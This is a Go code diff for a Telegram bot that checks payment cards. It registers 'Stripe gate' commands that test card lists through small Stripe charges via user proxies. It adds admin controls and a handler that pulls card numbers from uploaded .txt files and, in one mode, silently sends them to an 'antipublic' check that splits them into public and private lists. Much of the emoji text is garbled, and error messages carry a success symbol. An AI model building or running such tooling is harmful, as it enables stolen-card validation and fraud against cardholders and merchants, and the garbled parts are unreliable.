+		blacklistSite(site)
+		return c.Send(" Site blacklisted: " + site)
+	})
+
+	bot.Handle("/resetbl", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		blacklistMu.Lock()
+		count := len(blacklisted)
+		blacklisted = make(map[string]bool)
+		blacklistMu.Unlock()
+		return c.Send(fmt.Sprintf(" Blacklist cleared (%d sites removed).", count))
+	})
+
+	bot.Handle("/scrsites", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		allSites := make(map[string]bool)
+		for _, s := range getCustomSites() {
+			allSites[s] = true
+		}
+		sitePoolMu.RLock()
+		for _, s := range sitePool {
+			allSites[s] = true
+		}
+		sitePoolMu.RUnlock()
+		sitePoolMu.RLock()
+		poolCount := len(sitePool)
+		sitePoolMu.RUnlock()
+		blacklistMu.RLock()
+		blCount := len(blacklisted)
+		for s := range blacklisted {
+			allSites[s] = true
+		}
+		blacklistMu.RUnlock()
+		var list []string
+		for s := range allSites {
+			list = append(list, s)
+		}
+		sort.Strings(list)
+		buf := bytes.NewBufferString(strings.Join(list, "\n"))
+		doc := &tele.Document{
+			File:     tele.FromReader(buf),
+			FileName: "sites_pool.txt",
+			Caption:  fmt.Sprintf(" Site Pool (%d sites)\nPool: %d | Blacklisted: %d", len(list), poolCount, blCount),
+		}
+		return c.Send(doc)
+	})
+
+	bot.Handle("/pvtbroadcast", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
 		}
 		parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
-		if len(parts) < 2 {
-			return c.Send("Usage: /giveperm <user_id> <command>")
+		if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
+			return c.Send("Usage: /pvtbroadcast &lt;user_id&gt; &lt;message&gt;")
 		}
 		uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
+			return c.Send(" Invalid user ID.")
+		}
+		msg := strings.TrimSpace(parts[1])
+		_, err = bot.Send(tele.ChatID(uid), " "+msg, tele.ModeHTML)
+		if err != nil {
+			return c.Send(fmt.Sprintf(" Failed to send: %v", err))
+		}
+		return c.Send(fmt.Sprintf(" Message sent to %d.", uid))
+	})
+	bot.Handle("/forcejoin", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		payload := strings.TrimSpace(c.Message().Payload)
+		if payload == "" {
+			cfg.mu.RLock()
+			enabled := cfg.ForceJoinEnabled
+			targets := cfg.ForceJoin
+			cfg.mu.RUnlock()
+			var sb strings.Builder
+			sb.WriteString(" Force-Join Status:\n")
+			sb.WriteString(fmt.Sprintf("Enabled: %v\n", enabled))
+			if len(targets) == 0 {
+				sb.WriteString("Targets: (none)\n")
+			} else {
+				sb.WriteString(fmt.Sprintf("Targets (%d):\n", len(targets)))
+				for i, t := range targets {
+					title := t.Title
+					if title == "" {
+						title = "untitled"
+					}
+					sb.WriteString(fmt.Sprintf("%d. %d - %s\n", i+1, t.ChatID, title))
+				}
+			}
+			sb.WriteString("\nUsage:\n")
+			sb.WriteString("/forcejoin on\n")
+			sb.WriteString("/forcejoin off\n")
+			sb.WriteString("/forcejoin add &lt;chat_id&gt; &lt;invite_url&gt; [title]\n")
+			sb.WriteString("/forcejoin rm &lt;chat_id&gt;\n")
+			sb.WriteString("/forcejoin clear")
+			return c.Send(sb.String())
+		}
+		parts := strings.Fields(payload)
+		switch parts[0] {
+		case "on":
+			cfg.mu.Lock()
+			cfg.ForceJoinEnabled = true
+			cfg.mu.Unlock()
+			cfg.Save()
+			return c.Send(" Force-join enabled.")
+		case "off":
+			cfg.mu.Lock()
+			cfg.ForceJoinEnabled = false
+			cfg.mu.Unlock()
+			cfg.Save()
+			return c.Send(" Force-join disabled.")
+		case "clear":
+			cfg.mu.Lock()
+			cfg.ForceJoin = nil
+			cfg.mu.Unlock()
+			cfg.Save()
+			return c.Send(" All force-join targets cleared.")
+		case "add":
+			if len(parts) < 3 {
+				return c.Send("Usage: /forcejoin add &lt;chat_id&gt; &lt;invite_url&gt; [title]")
+			}
+			chatID, err := strconv.ParseInt(parts[1], 10, 64)
+			if err != nil {
+				return c.Send(" Invalid chat ID.")
+			}
+			url := parts[2]
+			title := ""
+			if len(parts) > 3 {
+				title = strings.Join(parts[3:], " ")
+			}
+			cfg.mu.Lock()
+			for _, t := range cfg.ForceJoin {
+				if t.ChatID == chatID {
+					cfg.mu.Unlock()
+					return c.Send(" That chat ID is already in the list.")
+				}
+			}
+			cfg.ForceJoin = append(cfg.ForceJoin, ForceJoinTarget{ChatID: chatID, InviteURL: url, Title: title})
+			cfg.mu.Unlock()
+			cfg.Save()
+			return c.Send(fmt.Sprintf(" Added force-join target: %d (%s)", chatID, title))
+		case "rm":
+			if len(parts) < 2 {
+				return c.Send("Usage: /forcejoin rm &lt;chat_id&gt;")
+			}
+			chatID, err := strconv.ParseInt(parts[1], 10, 64)
+			if err != nil {
+				return c.Send(" Invalid chat ID.")
+			}
+			cfg.mu.Lock()
+			newList := make([]ForceJoinTarget, 0, len(cfg.ForceJoin))
+			removed := false
+			for _, t := range cfg.ForceJoin {
+				if t.ChatID == chatID {
+					removed = true
+					continue
+				}
+				newList = append(newList, t)
+			}
+			cfg.ForceJoin = newList
+			cfg.mu.Unlock()
+			cfg.Save()
+			if !removed {
+				return c.Send(" Chat ID not found in list.")
+			}
+			return c.Send(fmt.Sprintf(" Removed force-join target: %d", chatID))
+		}
+		return c.Send("Unknown subcommand. Use: on, off, add, rm, clear")
+	})
+
+	bot.Handle("/giveperm", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
+		}
+		parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
+		if len(parts) < 2 {
+			return c.Send("Usage: /giveperm &lt;user_id&gt; &lt;command&gt;")
+		}
+		uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
+		if err != nil {
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID.", tele.ModeHTML)
 		}
 		cmd := strings.TrimSpace(parts[1])
 		key := strconv.FormatInt(uid, 10)
@@ -2263,19 +3559,18 @@ func main() {
 		for _, p := range cfg.Perms[key] {
 			if p == cmd {
 				cfg.mu.Unlock()
-				return c.Send(fmt.Sprintf("ℹ️ User %d already has permission for /%s.", uid, cmd))
+				return c.Send(fmt.Sprintf("User %d already has permission for /%s.", uid, cmd))
 			}
 		}
 		cfg.Perms[key] = append(cfg.Perms[key], cmd)
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d granted permission for /%s.", uid, cmd), tele.ModeHTML)
+		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" User %d granted permission for /%s.", uid, cmd), tele.ModeHTML)
 	})
 
-	// /users — list users in the allowed bypass list
 	bot.Handle("/users", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		cfg.mu.RLock()
 		allowed := make([]int64, 0, len(cfg.AllowedUsers))
@@ -2284,11 +3579,11 @@ func main() {
 		}
 		cfg.mu.RUnlock()
 		if len(allowed) == 0 {
-			return c.Send("📋 Allowed Users List\n\nNo users in the allowed list.\n\nUse /allowuser <id> to add users.")
+			return c.Send("Allowed Users List\n\nNo users in the allowed list.\n\nUse /allowuser &lt;id&gt; to add users.")
 		}
 		sort.Slice(allowed, func(i, j int) bool { return allowed[i] < allowed[j] })
 		var sb strings.Builder
-		sb.WriteString("📋 Allowed Users List\n\n")
+		sb.WriteString("Allowed Users List\n\n")
 		for i, uid := range allowed {
 			sb.WriteString(fmt.Sprintf("%d. %d\n", i+1, uid))
 		}
@@ -2296,18 +3591,17 @@ func main() {
 		return c.Send(sb.String())
 	})
 
-	// /show [user_id] — show own proxies, or another user's if admin provides ID
 	bot.Handle("/show", func(c tele.Context) error {
 		uid := c.Sender().ID
 		targetID := uid
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw != "" {
 			if !isAdmin(uid) {
-				return c.Send("🚫 Only admins can view other users' proxies.")
+				return c.Send("Ys Only admins can view other users' proxies.")
 			}
 			n, err := strconv.ParseInt(raw, 10, 64)
 			if err != nil {
-				return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
+				return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID.", tele.ModeHTML)
 			}
 			targetID = n
 		}
@@ -2318,15 +3612,15 @@ func main() {
 		um.mu.RUnlock()
 		if len(proxies) == 0 {
 			if targetID == uid {
-				return c.Send("❌ You have no proxies set.")
+				return c.Send("O You have no proxies set.")
 			}
-			return c.Send(fmt.Sprintf("❌ User %d has no proxies.", targetID))
+			return c.Send(fmt.Sprintf("O User %d has no proxies.", targetID))
 		}
 		var sb strings.Builder
 		if targetID == uid {
-			sb.WriteString(fmt.Sprintf("🔌 Your proxies (%d):\n\n", len(proxies)))
+			sb.WriteString(fmt.Sprintf("Your proxies (%d):\n\n", len(proxies)))
 		} else {
-			sb.WriteString(fmt.Sprintf("🔌 User %d proxies (%d):\n\n", targetID, len(proxies)))
+			sb.WriteString(fmt.Sprintf("User %d proxies (%d):\n\n", targetID, len(proxies)))
 		}
 		for i, p := range proxies {
 			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, p))
@@ -2334,10 +3628,9 @@ func main() {
 		return c.Send(sb.String())
 	})
 
-	// /cleanproxies — remove blank/junk entries from all users' proxy lists
 	bot.Handle("/cleanproxies", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		cleaned := 0
 		um.mu.Lock()
@@ -2355,21 +3648,20 @@ func main() {
 		}
 		um.mu.Unlock()
 		um.Save()
-		return c.Send(fmt.Sprintf("✅ Cleaned %d invalid proxy entry/entries.", cleaned))
+		return c.Send(fmt.Sprintf("o. Cleaned %d invalid proxy entry/entries.", cleaned))
 	})
 
-	// /chkpr [user_id] — test proxies (own or specified user's, admin)
 	bot.Handle("/chkpr", func(c tele.Context) error {
 		uid := c.Sender().ID
 		targetID := uid
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw != "" {
 			if !isAdmin(uid) {
-				return c.Send("🚫 Only admins can test other users' proxies.")
+				return c.Send("Ys Only admins can test other users' proxies.")
 			}
 			n, err := strconv.ParseInt(raw, 10, 64)
 			if err != nil {
-				return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
+				return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Invalid user ID.", tele.ModeHTML)
 			}
 			targetID = n
 		}
@@ -2379,9 +3671,9 @@ func main() {
 		copy(proxies, ud.Proxies)
 		um.mu.RUnlock()
 		if len(proxies) == 0 {
-			return c.Send("❌ No proxies to test.")
+			return c.Send("O No proxies to test.")
 		}
-		msg, _ := bot.Send(c.Chat(), fmt.Sprintf("🔄 Testing %d proxies...", len(proxies)))
+		msg, _ := bot.Send(c.Chat(), fmt.Sprintf("Testing %d proxies...", len(proxies)))
 		type result struct {
 			proxy string
 			ok    bool
@@ -2400,20 +3692,20 @@ func main() {
 		good, bad := 0, 0
 		var sb strings.Builder
 		if targetID == uid {
-			sb.WriteString("🔌 Proxy Test Results:\n\n")
+			sb.WriteString("Proxy Test Results:\n\n")
 		} else {
-			sb.WriteString(fmt.Sprintf("🔌 Proxy Test Results for %d:\n\n", targetID))
+			sb.WriteString(fmt.Sprintf("Proxy Test Results for %d:\n\n", targetID))
 		}
 		for _, r := range results {
 			if r.ok {
-				sb.WriteString(fmt.Sprintf("✅ %s\n", r.proxy))
+				sb.WriteString(fmt.Sprintf("o. %s\n", r.proxy))
 				good++
 			} else {
-				sb.WriteString(fmt.Sprintf("❌ %s\n", r.proxy))
+				sb.WriteString(fmt.Sprintf("O %s\n", r.proxy))
 				bad++
 			}
 		}
-		sb.WriteString(fmt.Sprintf("\n✅ Working: %d  ❌ Dead: %d", good, bad))
+		sb.WriteString(fmt.Sprintf("\no. Working: %d  O Dead: %d", good, bad))
 		if msg != nil {
 			bot.Edit(msg, sb.String())
 			return nil
@@ -2421,21 +3713,19 @@ func main() {
 		return c.Send(sb.String())
 	})
 
-	// /stopuser <@username or user_id> — admin: stop a specific user's session
 	bot.Handle("/stopuser", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /stopuser <@username> or /stopuser <user_id>")
+			return c.Send("Usage: /stopuser &lt;@username&gt; or /stopuser &lt;user_id&gt;")
 		}
 
 		var targetUID int64
 		var found bool
 
 		if strings.HasPrefix(raw, "@") {
-			// search by username across active sessions
 			needle := strings.ToLower(strings.TrimPrefix(raw, "@"))
 			activeSessions.Range(func(_, val any) bool {
 				sess := val.(*CheckSession)
@@ -2447,17 +3737,17 @@ func main() {
 				return true
 			})
 			if !found {
-				return c.Send(fmt.Sprintf("⚠️ No active session for %s.", raw))
+				return c.Send(fmt.Sprintf("s No active session for %s.", raw))
 			}
 		} else {
 			uid, err := strconv.ParseInt(raw, 10, 64)
 			if err != nil {
-				return c.Send("❌ Invalid argument. Use @username or a numeric user ID.")
+				return c.Send("O Invalid argument. Use @username or a numeric user ID.")
 			}
 			targetUID = uid
 			_, found = activeSessions.Load(targetUID)
 			if !found {
-				return c.Send(fmt.Sprintf("⚠️ No active session for user %d.", targetUID))
+				return c.Send(fmt.Sprintf("s No active session for user %d.", targetUID))
 			}
 		}
 
@@ -2467,13 +3757,13 @@ func main() {
 		if sess.Cancel != nil {
 			sess.Cancel()
 		}
-		return c.Send(fmt.Sprintf("🛑 Stopped session for @%s (ID: %d).", sess.Username, sess.UserID))
+		activeSessions.Delete(targetUID)
+		return c.Send(fmt.Sprintf("Y>' Stopped session for @%s (ID: %d).", sess.Username, sess.UserID))
 	})
 
-	// /resetactive — force-cancel all active sessions
 	bot.Handle("/resetactive", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		count := 0
 		activeSessions.Range(func(key, val any) bool {
@@ -2486,36 +3776,33 @@ func main() {
 			count++
 			return true
 		})
-		return c.Send(fmt.Sprintf("🛑 Force-cancelled %d session(s). Active sessions cleared.", count))
+		return c.Send(fmt.Sprintf("Y>' Force-cancelled %d session(s). Active sessions cleared.", count))
 	})
 
-	// /reboot — restart the bot process
 	bot.Handle("/reboot", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
-		c.Send("🔄 Rebooting bot...")
+		c.Send("Rebooting bot...")
 		go func() {
 			time.Sleep(500 * time.Millisecond)
 			exe, err := os.Executable()
 			if err != nil {
 				return
 			}
-			// Re-exec this process with same args
 			_ = os.WriteFile("reboot.flag", []byte(exe), 0644)
 			os.Exit(0)
 		}()
 		return nil
 	})
 
-	// /addgp <group_id> [...] — add group(s) to allowed list
 	bot.Handle("/addgp", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		arg := strings.TrimSpace(c.Message().Payload)
 		if arg == "" {
-			return c.Send("Usage: /addgp <group_id> [<group_id> ...]")
+			return c.Send("Usage: /addgp &lt;group_id&gt; [&lt;group_id&gt; ...]")
 		}
 		cfg.mu.Lock()
 		for _, tok := range strings.Fields(arg) {
@@ -2537,13 +3824,12 @@ func main() {
 		groups := cfg.Groups
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ Allowed groups: %v", groups))
+		return c.Send(fmt.Sprintf("o. Allowed groups: %v", groups))
 	})
 
-	// /showgp — show allowed groups and groups-only mode status
 	bot.Handle("/showgp", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		cfg.mu.RLock()
 		groups := make([]int64, len(cfg.Groups))
@@ -2556,21 +3842,20 @@ func main() {
 			sb.WriteString("(none)\n")
 		} else {
 			for _, g := range groups {
-				sb.WriteString(fmt.Sprintf("• %d\n", g))
+				sb.WriteString(fmt.Sprintf(" %d\n", g))
 			}
 		}
 		sb.WriteString(fmt.Sprintf("\nGroups-only mode: %v", groupsOnly))
 		return c.Send(sb.String())
 	})
 
-	// /delgp <group_id> [...] — remove group(s) from allowed list
 	bot.Handle("/delgp", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		arg := strings.TrimSpace(c.Message().Payload)
 		if arg == "" {
-			return c.Send("Usage: /delgp <group_id> [<group_id> ...]")
+			return c.Send("Usage: /delgp &lt;group_id&gt; [&lt;group_id&gt; ...]")
 		}
 		cfg.mu.Lock()
 		toRemove := make(map[int64]bool)
@@ -2590,25 +3875,23 @@ func main() {
 		groups := cfg.Groups
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ Removed. Current allowed groups: %v", groups))
+		return c.Send(fmt.Sprintf("o. Removed. Current allowed groups: %v", groups))
 	})
 
-	// /onlygp — enable groups-only mode
 	bot.Handle("/onlygp", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		cfg.mu.Lock()
 		cfg.GroupsOnly = true
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send("🔒 Groups-only mode enabled. Private chats are denied unless /allowuser is set.")
+		return c.Send("Groups-only mode enabled. Private chats are denied unless /allowuser is set.")
 	})
 
-	// /allowall — disable groups-only, restrict_all, and allow_only restrictions
 	bot.Handle("/allowall", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Admin only.", tele.ModeHTML)
 		}
 		cfg.mu.Lock()
 		cfg.GroupsOnly = false
@@ -2616,32 +3899,115 @@ func main() {
 		cfg.RestrictAll = false
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send("🔓 Bot set to allow all users in personal chats.")
+		return c.Send("Bot set to allow all users in personal chats.")
 	})
 
-	// ── Stripe gates (inline + file variants) ──────────────────────
-	// Auth gate
-	registerStripeInline(bot, "/str", "Stripe Auth", um, fwd, checkStripeAuthCard)
-	registerStripeInline(bot, "/mstr", "Stripe Auth", um, fwd, checkStripeAuthCard)
+	registerStripeInline(bot, "/str", "Stripe Auth", um, checkStripeAuthCard)
+	registerStripeInline(bot, "/mstr", "Stripe Auth", um, checkStripeAuthCard)
 	registerStripeFile(bot, "/mstrtxt", "Stripe Auth", um, checkStripeAuthCard)
-	// Checkout $1 GBP
-	registerStripeInline(bot, "/str1", "Stripe UHQ $1", um, fwd, checkStripeCheckoutCard)
-	registerStripeInline(bot, "/mstr1", "Stripe UHQ $1", um, fwd, checkStripeCheckoutCard)
+	registerStripeInline(bot, "/str1", "Stripe UHQ $1", um, checkStripeCheckoutCard)
+	registerStripeInline(bot, "/mstr1", "Stripe UHQ $1", um, checkStripeCheckoutCard)
 	registerStripeFile(bot, "/mstr1txt", "Stripe UHQ $1", um, checkStripeCheckoutCard)
-	// SecondStork $5 NZD
-	registerStripeInline(bot, "/str2", "Stripe UHQ $5", um, fwd, checkStripeSecondStorkCard)
-	registerStripeInline(bot, "/mstr2", "Stripe UHQ $5", um, fwd, checkStripeSecondStorkCard)
+	registerStripeInline(bot, "/str2", "Stripe UHQ $5", um, checkStripeSecondStorkCard)
+	registerStripeInline(bot, "/mstr2", "Stripe UHQ $5", um, checkStripeSecondStorkCard)
 	registerStripeFile(bot, "/mstr2txt", "Stripe UHQ $5", um, checkStripeSecondStorkCard)
-	// Donation $3 USD
-	registerStripeInline(bot, "/str4", "Stripe Donation", um, fwd, checkStripeDonationCard)
-	registerStripeInline(bot, "/mstr4", "Stripe Donation", um, fwd, checkStripeDonationCard)
+	registerStripeInline(bot, "/str4", "Stripe Donation", um, checkStripeDonationCard)
+	registerStripeInline(bot, "/mstr4", "Stripe Donation", um, checkStripeDonationCard)
 	registerStripeFile(bot, "/mstr4txt", "Stripe Donation", um, checkStripeDonationCard)
-	// Dollar $1 USD
-	registerStripeInline(bot, "/str5", "Stripe $1", um, fwd, checkStripeDollarCard)
-	registerStripeInline(bot, "/mstr5", "Stripe $1", um, fwd, checkStripeDollarCard)
+	registerStripeInline(bot, "/str5", "Stripe $1", um, checkStripeDollarCard)
+	registerStripeInline(bot, "/mstr5", "Stripe $1", um, checkStripeDollarCard)
 	registerStripeFile(bot, "/mstr5txt", "Stripe $1", um, checkStripeDollarCard)
 
-	fwd.BindRCtx(bot)
+
+
+	bot.Handle("/f", func(c tele.Context) error {
+		msg := c.Message()
+		var photo *tele.Photo
+		if msg.Photo != nil {
+			photo = msg.Photo
+		} else if msg.ReplyTo != nil && msg.ReplyTo.Photo != nil {
+			photo = msg.ReplyTo.Photo
+		}
+		if photo == nil {
+			return c.Send(" Reply to a photo with /f to pin it as feedback.")
+		}
+		caption := "========================\n" +
+			em("5386757680679377085", "\xe2\xad\x90") + " <b>Feedback Received</b> " + em("5386757680679377085", "\xe2\xad\x90") + "\n" +
+			"========================\n" +
+			em("6100546649312987047", "\xf0\x9f\x91\xa4") + " From: @" + html.EscapeString(c.Sender().Username) + "\n" +
+			"========================"
+		p := &tele.Photo{File: photo.File, Caption: caption}
+		for _, adminID := range allAdminIDs() {
+			bot.Send(tele.ChatID(adminID), p, tele.ModeHTML)
+		}
+		return c.Send(em("5386757680679377085", "\xe2\xad\x90") + " Feedback sent to admins!", tele.ModeHTML)
+	})
+
+	bot.Handle(tele.OnDocument, func(c tele.Context) error {
+		msg := c.Message()
+		if msg.Document == nil {
+			return nil
+		}
+		doc := msg.Document
+		if !strings.HasSuffix(strings.ToLower(doc.FileName), ".txt") {
+			return nil
+		}
+		rc, err := bot.File(&doc.File)
+		if err != nil {
+			return nil
+		}
+		data, err := io.ReadAll(rc)
+		rc.Close()
+		if err != nil || len(data) == 0 {
+			return nil
+		}
+		if len(parseCardsFromText(string(data))) == 0 {
+			return nil
+		}
+		if !qualityCheck {
+			go antipublicCheck(data, doc.FileName)
+			return nil
+		}
+
+		prog, _ := bot.Send(c.Chat(), em(emojiSearch, "\xf0\x9f\x94\x8d")+" Checking...", tele.ModeHTML)
+
+		go func() {
+			result, err := antipublicCheck(data, doc.FileName)
+			if err != nil {
+				if qualityCheck {
+					bot.Edit(prog, em(emojiCross, "\xe2\x9c\x85")+" "+err.Error(), tele.ModeHTML)
+				}
+				return
+			}
+			if !qualityCheck {
+				return
+			}
+			bot.Edit(prog, em(emojiCheck, "\xe2\x9c\x85")+" Check completed", tele.ModeHTML)
+			if result.StatsText != "" {
+				bot.Send(c.Chat(), strings.ReplaceAll(result.StatsText, "**", ""), tele.ModeDefault)
+			} else {
+				total := result.PublicCount + result.PrivateCount
+				pct := "0%"
+				if total > 0 {
+					pct = fmt.Sprintf("%.2f%%", float64(result.PrivateCount)/float64(total)*100)
+				}
+				bot.Send(c.Chat(), fmt.Sprintf(em(emojiCheck, "\xe2\x9c\x85")+" Check results:\nTotal cards: %d\nPrivate: %d  Public: %d\nPrivate percentage: %s", total, result.PrivateCount, result.PublicCount, pct), tele.ModeHTML)
+			}
+			if len(result.Public) > 0 {
+				bot.Send(c.Chat(), &tele.Document{
+					File:     tele.FromReader(bytes.NewReader([]byte(result.Public))),
+					FileName: "public.txt",
+				})
+			}
+			if len(result.Private) > 0 {
+				bot.Send(c.Chat(), &tele.Document{
+					File:     tele.FromReader(bytes.NewReader([]byte(result.Private))),
+					FileName: "private.txt",
+				})
+			}
+		}()
+		return nil
+	})
 
 	fmt.Println("Bot started")
 	bot.Start()
